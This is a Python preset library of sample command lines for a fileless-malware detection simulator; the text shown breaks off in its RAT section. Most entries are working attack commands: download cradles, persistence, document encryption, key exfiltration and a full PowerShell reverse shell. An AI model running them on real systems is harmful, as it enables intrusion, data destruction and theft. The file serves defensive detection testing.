"""Built-in library of sample command presets for fileless malware detection simulation.

Covers 12 behavioral categories with 5 distinct demonstration scenarios each (60 total scenarios):
1. Benign Administration (5 scenarios)
2. PowerShell Fileless (5 scenarios)
3. WMI Malware (5 scenarios)
4. Process Hollowing (5 scenarios)
5. Reflective DLL Injection (5 scenarios)
6. Registry Resident Malware (5 scenarios)
7. Cobalt Strike Beacon Simulation (5 scenarios)
8. Metasploit Memory Payloads (5 scenarios)
9. LOLBins Abuse (5 scenarios)
10. Fileless Ransomware Stagers (5 scenarios)
11. Memory-Only RAT Telemetry (5 scenarios)
12. Empire Framework Launchers (5 scenarios)

All presets are safe behavioral simulations that populate the generic command input
and pass through the EXACT SAME detection pipeline as arbitrary custom user commands.
The selected preset's family theme is NEVER passed to the ML classifier as ground truth or hint.
"""

from __future__ import annotations

from typing import Any

BUILTIN_SAMPLE_COMMANDS: list[dict[str, Any]] = [
    # =========================================================================
    # 1. Benign Administration (5 scenarios)
    # =========================================================================
    {
        "id": "benign-ps-proc",
        "name": "Benign PowerShell - Process Enumeration",
        "category": "Benign Administration",
        "family_theme": "benign",
        "description": "Standard administrative process enumeration filtering by CPU utilization.",
        "command": "powershell.exe -Command \"Get-Process | Where-Object {$_.CPU -gt 10} | Select-Object Name, CPU, WorkingSet\"",
        "expected_behavior": "Nominal command entropy, no obfuscation flags, benign administrative telemetry.",
    },
    {
        "id": "benign-ps-service",
        "name": "Benign PowerShell - Service Status Query",
        "category": "Benign Administration",
        "family_theme": "benign",
        "description": "Lists running system services using standard pipeline formatting.",
        "command": "powershell.exe -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'} | Format-Table Name, DisplayName\"",
        "expected_behavior": "Clean process execution, zero network connections, normal telemetry baseline.",
    },
    {
        "id": "benign-ps-nettest",
        "name": "Benign PowerShell - Network Connection Diagnostic",
        "category": "Benign Administration",
        "family_theme": "benign",
        "description": "Standard connection test to a legitimate public endpoint over HTTPS.",
        "command": "powershell.exe -Command \"Test-NetConnection -ComputerName google.com -Port 443\"",
        "expected_behavior": "Standard network query, benign destination port, low suspicion score.",
    },
    {
        "id": "benign-cmd-dir",
        "name": "Benign CMD - Driver Directory Listing",
        "category": "Benign Administration",
        "family_theme": "benign",
        "description": "Recursive directory listing of system drivers via native command prompt.",
        "command": "cmd.exe /c dir C:\\Windows\\System32\\drivers /s /b",
        "expected_behavior": "Benign shell utility, zero evasive flags, nominal process tree.",
    },
    {
        "id": "benign-cmd-netstat",
        "name": "Benign CMD - IP & Socket Diagnostics",
        "category": "Benign Administration",
        "family_theme": "benign",
        "description": "Inspects local IP network configuration and active socket tables.",
        "command": "cmd.exe /c ipconfig /all && netstat -ano",
        "expected_behavior": "Standard network diagnostic commands, benign host telemetry.",
    },

    # =========================================================================
    # 2. PowerShell Fileless (5 scenarios)
    # =========================================================================
    {
        "id": "ps-fileless-amsi",
        "name": "PowerShell Fileless - Reflection Security Probe",
        "category": "PowerShell Fileless",
        "family_theme": "powershell_fileless",
        "description": "In-memory reflection attempt inspecting internal automation fields.",
        "command": "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')\"",
        "expected_behavior": "Reflective API usage, hidden window style flag, elevated NLP token risk.",
    },
    {
        "id": "ps-fileless-cradle",
        "name": "PowerShell Fileless - WebClient Download Cradle",
        "category": "PowerShell Fileless",
        "family_theme": "powershell_fileless",
        "description": "Classic fileless download cradle pulling simulated script from HTTP into memory via IEX.",
        "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/stage2.ps1')\"",
        "expected_behavior": "Download cradle flag, execution policy bypass flag, NLP transformer cradle detection.",
    },
    {
        "id": "ps-fileless-enc-c2",
        "name": "PowerShell Fileless - Base64 Payload Cradle",
        "category": "PowerShell Fileless",
        "family_theme": "powershell_fileless",
        "description": "Base64-encoded UTF-16LE PowerShell cradle executing remote script in memory.",
        "command": "powershell.exe -NoP -Sta -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBlAGMAdQByAGkAdAB5AC4AbABvAGMAYQBsAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==",
        "expected_behavior": "High Shannon entropy, Base64 flag, hidden window flag, download cradle detection.",
    },
    {
        "id": "ps-fileless-valloc",
        "name": "PowerShell Fileless - Memory Allocator Stager",
        "category": "PowerShell Fileless",
        "family_theme": "powershell_fileless",
        "description": "Compiles P/Invoke signature for memory allocation API to allocate executable memory.",
        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\\\"kernel32\\\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); }'\"",
        "expected_behavior": "Execution policy bypass, hidden window, Win32 API memory allocation indicators.",
    },
    {
        "id": "ps-fileless-iwr-mem",
        "name": "PowerShell Fileless - Invoke-RestMethod Assembly Stager",
        "category": "PowerShell Fileless",
        "family_theme": "powershell_fileless",
        "description": "Uses Invoke-RestMethod to retrieve raw byte stream and execute via reflection without disk footprint.",
        "command": "powershell.exe -ep bypass -nop -w 1 -c \"[System.Reflection.Assembly]::Load((Invoke-RestMethod -Uri 'http://10.10.14.5:8000/staged.dll' -UseBasicParsing)).EntryPoint.Invoke($null,$null)\"",
        "expected_behavior": "Reflection assembly load in-memory, execution bypass, hidden window flag.",
    },

    # =========================================================================
    # 3. WMI Malware (5 scenarios)
    # =========================================================================
    {
        "id": "wmi-event-filter",
        "name": "WMI Malware - Permanent Event Filter",
        "category": "WMI Malware",
        "family_theme": "wmi_malware",
        "description": "Configures permanent WMI __EventFilter and CommandLineEventConsumer for fileless persistence.",
        "command": "wmic.exe /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"BkupFilter\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"",
        "expected_behavior": "LOLBin flag (wmic), WMI persistence anomaly, elevated handle count.",
    },
    {
        "id": "wmi-consumer-stager",
        "name": "WMI Malware - CommandLineEventConsumer Stager",
        "category": "WMI Malware",
        "family_theme": "wmi_malware",
        "description": "Binds WMI event filter to hidden PowerShell command consumer executing in background.",
        "command": "wmic.exe /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"BkupConsumer\", CommandLineTemplate=\"powershell.exe -NoP -W Hidden -Enc SQBFAFgA...\", RunInteractively=\"False\"",
        "expected_behavior": "WMI event consumer creation, hidden PowerShell execution template.",
    },
    {
        "id": "wmi-remote-process",
        "name": "WMI Malware - Remote Process Spawning",
        "category": "WMI Malware",
        "family_theme": "wmi_malware",
        "description": "Spawns hidden process on remote workstation via WMI Win32_Process call.",
        "command": "wmic.exe /node:192.168.1.50 process call create \"powershell.exe -ep bypass -w hidden -enc JABzACAAPQ...\"",
        "expected_behavior": "WMI remote node targeting, execution bypass, encoded payload.",
    },
    {
        "id": "wmi-recon-query",
        "name": "WMI Malware - System & Defense Reconnaissance",
        "category": "WMI Malware",
        "family_theme": "wmi_malware",
        "description": "Queries WMI namespace for active security products and OS configuration before staging.",
        "command": "wmic.exe /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState && wmic.exe process get name,parentprocessid,processid",
        "expected_behavior": "Defense enumeration via WMI, process tree inspection.",
    },
    {
        "id": "wmi-shadow-consumer",
        "name": "WMI Malware - FilterConsumerBinding Link",
        "category": "WMI Malware",
        "family_theme": "wmi_malware",
        "description": "Completes fileless WMI persistence triad by linking __FilterToConsumerBinding.",
        "command": "wmic.exe /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"BkupFilter\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"BkupConsumer\\\"\"",
        "expected_behavior": "Permanent WMI consumer binding, registry/WMI repository anomaly.",
    },

    # =========================================================================
    # 4. Process Hollowing (5 scenarios)
    # =========================================================================
    {
        "id": "hollowing-svchost",
        "name": "Process Hollowing - Svchost Memory Allocation",
        "category": "Process Hollowing",
        "family_theme": "process_hollowing",
        "description": "Simulates process creation in suspended state and unmapping of svchost.exe memory space.",
        "command": "powershell.exe -ep bypass -c \"$hProc = [Win32]::CreateProcess('C:\\Windows\\System32\\svchost.exe', 0x4); [Win32]::ZwUnmapViewOfSection($hProc); [Win32]::VirtualAllocEx($hProc, 0x1000, 0x40)\"",
        "expected_behavior": "Suspended process creation, ZwUnmapViewOfSection, unmapped executable memory.",
    },
    {
        "id": "hollowing-notepad-stager",
        "name": "Process Hollowing - Notepad Suspended Stager",
        "category": "Process Hollowing",
        "family_theme": "process_hollowing",
        "description": "Spawns suspended notepad.exe to overwrite PE entry point with payload in memory.",
        "command": "powershell.exe -w hidden -c \"Start-Process notepad.exe -WindowStyle Hidden -PassThru | ForEach-Object { [Memory]::WriteProcessMemory($_.Handle, 0x00400000, $data); [Win32]::ResumeThread($_.Handle) }\"",
        "expected_behavior": "Anomalous parent-child process relationship, suspended thread resumption.",
    },
    {
        "id": "hollowing-unmap-hook",
        "name": "Process Hollowing - Native Syscall Section Unmap",
        "category": "Process Hollowing",
        "family_theme": "process_hollowing",
        "description": "Invokes Native API ZwUnmapViewOfSection directly via dynamic syscall invocation.",
        "command": "powershell.exe -nop -c \"[DInvoke]::GetSyscall('ZwUnmapViewOfSection').Invoke([IntPtr]0x104, [IntPtr]0x7ff700000000)\"",
        "expected_behavior": "Direct syscall invocation, unmapped memory anomaly count, vad anomalies.",
    },
    {
        "id": "hollowing-explorer-target",
        "name": "Process Hollowing - Explorer Target Simulation",
        "category": "Process Hollowing",
        "family_theme": "process_hollowing",
        "description": "Targeting explorer.exe memory space to host unbacked shellcode and unlinked PE image.",
        "command": "powershell.exe -ExecutionPolicy Bypass -Command \"[Ref].Assembly.GetType('Sys.Mem').GetMethod('Hollow').Invoke($null, @('explorer.exe', 'http://10.10.14.5/stage.bin'))\"",
        "expected_behavior": "Hollowing injection heuristic, unlinked DLL count, RWX page count.",
    },
    {
        "id": "hollowing-vbc-spawn",
        "name": "Process Hollowing - Compiler Child Spawn Stager",
        "category": "Process Hollowing",
        "family_theme": "process_hollowing",
        "description": "Spawns legitimate Microsoft vbc.exe compiler and replaces image with payload in memory.",
        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe /target:exe /out:mem.exe && powershell.exe -w hidden -enc JABzACAAPQ...",
        "expected_behavior": "LOLBin compiler spawn, hidden replacement, elevated thread count.",
    },

    # =========================================================================
    # 5. Reflective DLL Injection (5 scenarios)
    # =========================================================================
    {
        "id": "reflective-rundll32",
        "name": "Reflective DLL - RunDLL32 Ordinal Export",
        "category": "Reflective DLL Injection",
        "family_theme": "reflective_dll_injection",
        "description": "Invokes export entry point of reflective DLL loaded purely in memory.",
        "command": "rundll32.exe C:\\Users\\Public\\reflective_loader.dll,Entry",
        "expected_behavior": "LOLBin flag (rundll32), DLL injection heuristic, unlinked DLL detection.",
    },
    {
        "id": "reflective-pe-loader",
        "name": "Reflective DLL - In-Memory Manual PE Loader",
        "category": "Reflective DLL Injection",
        "family_theme": "reflective_dll_injection",
        "description": "Parses PE headers and resolves IAT manually in allocated memory buffer without LoadLibrary.",
        "command": "powershell.exe -ep bypass -c \"[ReflectiveLoader]::LoadPE([System.IO.File]::ReadAllBytes('C:\\Users\\Public\\module.dll'))\"",
        "expected_behavior": "Unlinked DLL count elevation, zero disk LoadLibrary event, high RWX memory.",
    },
    {
        "id": "reflective-mem-stager",
        "name": "Reflective DLL - Dynamic Memory Staged DLL",
        "category": "Reflective DLL Injection",
        "family_theme": "reflective_dll_injection",
        "description": "Downloads raw DLL bytes from staging server and passes directly to ReflectiveLoader entry export.",
        "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.56.101:8000/rdll.dll'); [Reflective]::Inject($bytes)\"",
        "expected_behavior": "Download cradle, dynamic reflective injection, unmapped executable memory.",
    },
    {
        "id": "reflective-api-patch",
        "name": "Reflective DLL - In-Memory Module List Unlinking",
        "category": "Reflective DLL Injection",
        "family_theme": "reflective_dll_injection",
        "description": "Unlinks injected DLL from InLoadOrderModuleList to evade standard process module enumeration.",
        "command": "powershell.exe -w hidden -c \"[PEBUtils]::UnlinkModule('reflective_loader.dll'); [Win32]::CreateRemoteThread($hProc, $entryPoint)\"",
        "expected_behavior": "ldrmodules inconsistencies, unlinked DLL count, hidden process modules.",
    },
    {
        "id": "reflective-kernel32-lookup",
        "name": "Reflective DLL - In-Memory Export Resolver",
        "category": "Reflective DLL Injection",
        "family_theme": "reflective_dll_injection",
        "description": "Iterates PEB loaded modules list in memory to resolve GetProcAddress dynamically.",
        "command": "powershell.exe -nop -c \"[Ref].Assembly.GetType('Win32.Native').GetMethod('FindReflectiveExports').Invoke($null, @('kernel32.dll'))\"",
        "expected_behavior": "In-memory PEB walking, reflective resolver signature.",
    },

    # =========================================================================
    # 6. Registry Resident Malware (5 scenarios)
    # =========================================================================
    {
        "id": "reg-run-hidden-ps",
        "name": "Registry Malware - CurrentVersion\\Run Key",
        "category": "Registry Malware",
        "family_theme": "registry_resident_malware",
        "description": "Adds hidden PowerShell autorun entry into CurrentVersion\\Run registry hive.",
        "command": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SecurityUpdate /t REG_SZ /d \"powershell.exe -w hidden -enc SQBFAFgA...\" /f",
        "expected_behavior": "Registry persistence count flag, encoded command flag, hidden window flag.",
    },
    {
        "id": "reg-winlogon-userinit",
        "name": "Registry Malware - Winlogon Userinit Hijack",
        "category": "Registry Malware",
        "family_theme": "registry_resident_malware",
        "description": "Modifies Winlogon Userinit registry key to append hidden PowerShell stager.",
        "command": "reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,powershell.exe -w hidden -enc JABzACAAPQ...\" /f",
        "expected_behavior": "High-risk registry modification, winlogon persistence trigger.",
    },
    {
        "id": "reg-com-hijack",
        "name": "Registry Malware - COM Server InprocServer32 Hijack",
        "category": "Registry Malware",
        "family_theme": "registry_resident_malware",
        "description": "Hijacks CLSID in HKCU\\Software\\Classes\\CLSID pointing to in-memory reflective DLL script.",
        "command": "reg.exe add \"HKCU\\Software\\Classes\\CLSID\\{B54F3741-5B07-11cf-A4B0-00AA004A55E8}\\InprocServer32\" /ve /t REG_SZ /d \"C:\\Users\\Public\\loader.dll\" /f",
        "expected_behavior": "COM hijack persistence, registry anomaly heuristic.",
    },
    {
        "id": "reg-ifeo-debugger",
        "name": "Registry Malware - IFEO Debugger Hijack",
        "category": "Registry Malware",
        "family_theme": "registry_resident_malware",
        "description": "Installs Image File Execution Options debugger persistence on sethc.exe sticky keys.",
        "command": "reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"cmd.exe /c powershell.exe -w hidden -enc AQIDBAUG\" /f",
        "expected_behavior": "IFEO debugger persistence flag, encoded command flag.",
    },
    {
        "id": "reg-payload-storage",
        "name": "Registry Malware - Script Stored in Registry Hive",
        "category": "Registry Malware",
        "family_theme": "registry_resident_malware",
        "description": "Reads Base64 payload directly from registry value and evaluates in memory via IEX.",
        "command": "powershell.exe -nop -w hidden -c \"IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\AppData).Payload)))\"",
        "expected_behavior": "Fileless registry payload execution, IEX cradle, zero disk artifacts.",
    },

    # =========================================================================
    # 7. Cobalt Strike Beacon Simulation (5 scenarios)
    # =========================================================================
    {
        "id": "cs-beacon-http-c2",
        "name": "Cobalt Strike - HTTP C2 Interactive Beacon",
        "category": "Cobalt Strike Beacon",
        "family_theme": "cobalt_strike_beacon",
        "description": "Simulates Cobalt Strike HTTP beacon with periodic jitter intervals and reflective injection.",
        "command": "powershell.exe -nop -w hidden -c \"$c2='http://192.168.56.101:80/beacon.http'; while($true){ $task=(Invoke-WebRequest $c2 -Headers @{'Cookie'='SESSIONID=CS991'}).Content; IEX $task; Start-Sleep -s 10 }\"",
        "expected_behavior": "Periodic beacon regularity, C2 HTTP traffic, unmapped executable memory trigger.",
    },
    {
        "id": "cs-beacon-https-jitter",
        "name": "Cobalt Strike - HTTPS Jitter Beacon Stager",
        "category": "Cobalt Strike Beacon",
        "family_theme": "cobalt_strike_beacon",
        "description": "HTTPS stager with random jitter sleep pattern simulating evasive command-and-control.",
        "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"$wc=New-Object Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64)'); IEX $wc.DownloadString('https://c2.security-update.org:443/match')\"",
        "expected_behavior": "High entropy stager, user-agent spoofing, HTTPS beacon connection.",
    },
    {
        "id": "cs-beacon-namedpipe",
        "name": "Cobalt Strike - Named Pipe SMB Lateral Beacon",
        "category": "Cobalt Strike Beacon",
        "family_theme": "cobalt_strike_beacon",
        "description": "Connects to internal SMB named pipe for lateral beacon routing.",
        "command": "powershell.exe -w hidden -c \"$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', 'msagent_99', [System.IO.Pipes.PipeDirection]::InOut); $pipe.Connect(5000)\"",
        "expected_behavior": "Named pipe lateral movement indicator, elevated thread count.",
    },
    {
        "id": "cs-beacon-raw-socket",
        "name": "Cobalt Strike - Direct Socket Beacon (Port 4444)",
        "category": "Cobalt Strike Beacon",
        "family_theme": "cobalt_strike_beacon",
        "description": "Raw TCP beacon socket connecting to external C2 listener on suspicious port 4444.",
        "command": "powershell.exe -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ IEX([Text.Encoding]::ASCII.GetString($bytes,0,$i)) }\"",
        "expected_behavior": "Suspicious port 4444 usage, interactive socket loop, IEX execution.",
    },
    {
        "id": "cs-beacon-dns-tunnel",
        "name": "Cobalt Strike - DNS Egress Tunnel Simulation",
        "category": "Cobalt Strike Beacon",
        "family_theme": "cobalt_strike_beacon",
        "description": "Simulates DNS TXT record querying for stage2 payload chunks over base64 subdomains.",
        "command": "powershell.exe -nop -c \"1..8 | ForEach-Object { (Resolve-DnsName -Type TXT -Name \\\"$_.stage.c2domain.net\\\").Strings } | Out-String | IEX\"",
        "expected_behavior": "High DNS query volume, TXT record execution, in-memory IEX.",
    },

    # =========================================================================
    # 8. Metasploit Memory Payloads (5 scenarios)
    # =========================================================================
    {
        "id": "msf-meterpreter-rev-tcp",
        "name": "Metasploit - Meterpreter Reverse TCP",
        "category": "Metasploit Memory Payloads",
        "family_theme": "metasploit_memory_payloads",
        "description": "Standard Meterpreter reverse TCP stager connecting to multi/handler listener.",
        "command": "powershell.exe -nop -w hidden -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAGMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAwADEAJwAsADQANAA0ADQAKQA=",
        "expected_behavior": "Encoded command, hidden window, suspicious port 4444, reverse TCP socket.",
    },
    {
        "id": "msf-meterpreter-rev-https",
        "name": "Metasploit - Meterpreter Reverse HTTPS",
        "category": "Metasploit Memory Payloads",
        "family_theme": "metasploit_memory_payloads",
        "description": "Meterpreter payload configured with SSL transport stager fetching 2nd-stage DLL in memory.",
        "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX((New-Object Net.WebClient).DownloadString('https://192.168.56.101:8443/INIT_STAGE'))\"",
        "expected_behavior": "Certificate validation bypass, HTTPS stager on port 8443, download cradle.",
    },
    {
        "id": "msf-shellcode-valloc-exec",
        "name": "Metasploit - In-Memory Allocation Runner",
        "category": "Metasploit Memory Payloads",
        "family_theme": "metasploit_memory_payloads",
        "description": "P/Invoke VirtualAlloc + CreateThread stager executing in-memory payload bytes.",
        "command": "powershell.exe -ep bypass -c \"$addr = [Win32]::VirtualAlloc(0, 4096, 0x3000, 0x40); [System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $addr, $payload.Length); [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)\"",
        "expected_behavior": "RWX page allocation, memory staging signature, in-memory thread execution.",
    },
    {
        "id": "msf-web-delivery",
        "name": "Metasploit - Web Delivery Script Stager",
        "category": "Metasploit Memory Payloads",
        "family_theme": "metasploit_memory_payloads",
        "description": "Metasploit script/web_delivery payload cradle string.",
        "command": "powershell.exe -nop -w hidden -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUANgAuADEAMAAxADoAOAAwADgAMAAvAGsAMwBNAGgAJwApAA==",
        "expected_behavior": "Base64 encoded web delivery stager, port 8080 download cradle.",
    },
    {
        "id": "msf-reflective-inject",
        "name": "Metasploit - In-Memory Process Injector",
        "category": "Metasploit Memory Payloads",
        "family_theme": "metasploit_memory_payloads",
        "description": "Injects in-memory DLL payload directly into remote process without touching disk.",
        "command": "powershell.exe -ep bypass -c \"[Metasploit]::InjectDll((Get-Process lsass).Id, 'http://192.168.56.101:8080/stage.dll')\"",
        "expected_behavior": "Targeting high-privilege process, reflective DLL injection, RWX pages.",
    },

    # =========================================================================
    # 9. LOLBins Abuse (5 scenarios)
    # =========================================================================
    {
        "id": "lolbin-certutil-urlcache",
        "name": "LOLBin Abuse - CertUtil Remote Download",
        "category": "LOLBins Abuse",
        "family_theme": "lolbins_abuse",
        "description": "Abuses certutil.exe URL cache to fetch remote stager payload from external host.",
        "command": "certutil.exe -urlcache -split -f http://192.168.56.101:8000/stage2.txt %TEMP%\\stage2.txt && powershell.exe -ep bypass -File %TEMP%\\stage2.txt",
        "expected_behavior": "LOLBin flag (certutil), suspicious process chain, execution policy bypass.",
    },
    {
        "id": "lolbin-mshta-vbscript",
        "name": "LOLBin Abuse - MSHTA Inline VBScript",
        "category": "LOLBins Abuse",
        "family_theme": "lolbins_abuse",
        "description": "Executes malicious inline VBScript via mshta.exe spawning hidden PowerShell.",
        "command": "mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell.exe -enc AQIDBAUG\"\",0,True\"))",
        "expected_behavior": "LOLBin flag (mshta), anomalous parent-child process relationship.",
    },
    {
        "id": "lolbin-regsvr32-sct",
        "name": "LOLBin Abuse - Regsvr32 Remote Scriptlet",
        "category": "LOLBins Abuse",
        "family_theme": "lolbins_abuse",
        "description": "Squiblydoo technique: executes remote XML scriptlet via regsvr32 scrobj.dll.",
        "command": "regsvr32.exe /s /n /u /i:http://192.168.56.101:8080/payload.sct scrobj.dll",
        "expected_behavior": "LOLBin flag (regsvr32), scrobj.dll execution, outbound HTTP connection.",
    },
    {
        "id": "lolbin-bitsadmin-transfer",
        "name": "LOLBin Abuse - BITSAdmin Background Download",
        "category": "LOLBins Abuse",
        "family_theme": "lolbins_abuse",
        "description": "Abuses Background Intelligent Transfer Service to download remote payload in the background.",
        "command": "bitsadmin.exe /transfer myDownloadJob /download /priority high http://10.10.14.5/beacon.dll C:\\Users\\Public\\beacon.dll",
        "expected_behavior": "LOLBin flag (bitsadmin), outbound connection to remote IP.",
    },
    {
        "id": "lolbin-msbuild-inline",
        "name": "LOLBin Abuse - MSBuild Inline Compilation",
        "category": "LOLBins Abuse",
        "family_theme": "lolbins_abuse",
        "description": "Executes unmanaged C# payload compiled dynamically via legitimate MSBuild.exe XML project.",
        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\build.xml",
        "expected_behavior": "LOLBin flag (msbuild), inline code compilation, elevated process privileges.",
    },

    # =========================================================================
    # 10. Fileless Ransomware Stagers (5 scenarios)
    # =========================================================================
    {
        "id": "ransom-vssadmin-delete",
        "name": "Fileless Ransomware - Shadow Copy Wipe",
        "category": "Fileless Ransomware",
        "family_theme": "fileless_ransomware",
        "description": "Deletes volume shadow copies and disables Windows recovery catalog before encryption.",
        "command": "powershell.exe -ep bypass -c \"vssadmin.exe delete shadows /all /quiet; bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures; bcdedit.exe /set {default} recoveryenabled no; wbadmin.exe delete catalog -quiet\"",
        "expected_behavior": "Shadow copy destruction, boot configuration modification, elevated privileges.",
    },
    {
        "id": "ransom-mem-aes-locker",
        "name": "Fileless Ransomware - In-Memory AES Script Locker",
        "category": "Fileless Ransomware",
        "family_theme": "fileless_ransomware",
        "description": "In-memory script encrypting document directories via .NET RijndaelManaged without dropping binary.",
        "command": "powershell.exe -nop -w hidden -c \"$aes = New-Object Security.Cryptography.RijndaelManaged; Get-ChildItem -Path $env:USERPROFILE\\Documents -Recurse -Include *.docx,*.xlsx | ForEach-Object { [System.IO.File]::WriteAllBytes($_.FullName, [Crypto]::Encrypt([System.IO.File]::ReadAllBytes($_.FullName), $key)) }\"",
        "expected_behavior": "Rapid handle count elevation, multi-file stream access, high memory entropy.",
    },
    {
        "id": "ransom-key-exfil-c2",
        "name": "Fileless Ransomware - Encryption Key Exfiltration",
        "category": "Fileless Ransomware",
        "family_theme": "fileless_ransomware",
        "description": "Generates dynamic session key in memory and exfiltrates over HTTPS socket before locking files.",
        "command": "powershell.exe -ep bypass -c \"$key = [Guid]::NewGuid().ToString(); (New-Object Net.WebClient).UploadString('https://ransom-c2.darknet.to/register', $key); IEX (Get-Content C:\\Users\\Public\\locker.ps1)\"",
        "expected_behavior": "Outbound key exfiltration, download cradle, fileless staging.",
    },
    {
        "id": "ransom-stop-services",
        "name": "Fileless Ransomware - Database & Security Killer",
        "category": "Fileless Ransomware",
        "family_theme": "fileless_ransomware",
        "description": "Stops SQL, backup, and security services via PowerShell to release locked target files.",
        "command": "powershell.exe -Command \"Get-Service -Name *SQL*,*Exchange*,*Backup*,*VSS* | Stop-Service -Force -ErrorAction SilentlyContinue\"",
        "expected_behavior": "Mass service termination, elevated privilege check.",
    },
    {
        "id": "ransom-note-spawner",
        "name": "Fileless Ransomware - Memory Staged Ransom Note",
        "category": "Fileless Ransomware",
        "family_theme": "fileless_ransomware",
        "description": "Spawns mshta.exe displaying HTML ransom demand after completed in-memory encryption loop.",
        "command": "powershell.exe -w hidden -c \"mshta.exe 'javascript:document.write(\\\"<h1>ALL YOUR FILES ARE ENCRYPTED</h1>\\\");'\"",
        "expected_behavior": "LOLBin mshta invocation, anomalous child spawn.",
    },

    # =========================================================================
    # 11. Memory-Only RAT Telemetry (5 scenarios)
    # =========================================================================
    {
        "id": "rat-keylogger-hook",
        "name": "Memory RAT - SetWindowsHookEx Keystroke Logger",
        "category": "Memory-Only RAT",
        "family_theme": "memory_only_rat",
        "description": "Installs WH_KEYBOARD_LL low-level hook purely in memory to capture keystrokes.",
        "command": "powershell.exe -ep bypass -c \"[Win32]::SetWindowsHookEx(13, [Win32]::GetHookProc(), [Win32]::GetModuleHandle('user32.dll'), 0)\"",
        "expected_behavior": "Low-level API hook, elevated handle count, injected code region.",
    },
    {
        "id": "rat-screen-capture-stager",
        "name": "Memory RAT - In-Memory Screen Capture Loop",
        "category": "Memory-Only RAT",
        "family_theme": "memory_only_rat",
        "description": "Captures desktop framebuffer in memory and streams bitmap to C2 over raw socket.",
        "command": "powershell.exe -nop -w hidden -c \"Add-Type -AssemblyName System.Windows.Forms; $b = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g=[Drawing.Graphics]::FromImage($b); while($true){ $g.CopyFromScreen(0,0,0,0,$b.Size); (New-Object Net.Sockets.TcpClient('192.168.56.101', 9001)).GetStream().Write($stream) }\"",
        "expected_behavior": "GDI screen capture, continuous outbound socket to port 9001.",
    },
    {
        "id": "rat-interactive-cmd-shell",
        "name": "Memory RAT - Interactive Reverse Shell Loop",
        "category": "Memory-Only RAT",
        "family_theme": "memory_only_rat",
        "description": "Interactive command shell loop relaying stdin/stdout directly to remote TCP endpoint.",
        "command": "powershell.exe -w hidden -c \"$c = New-Object Net.Sockets.TcpClient('10.10.14.5', 1337); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){ $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $d 2>&1 | Out-String ); $sb2 = $sb + 'PS ' + (pwd).Path + '> '; $by = ([text.encoding]::ASCII).GetBytes($sb2); $s.Write($by,0,$by.Length); $s.Flush() }\"",
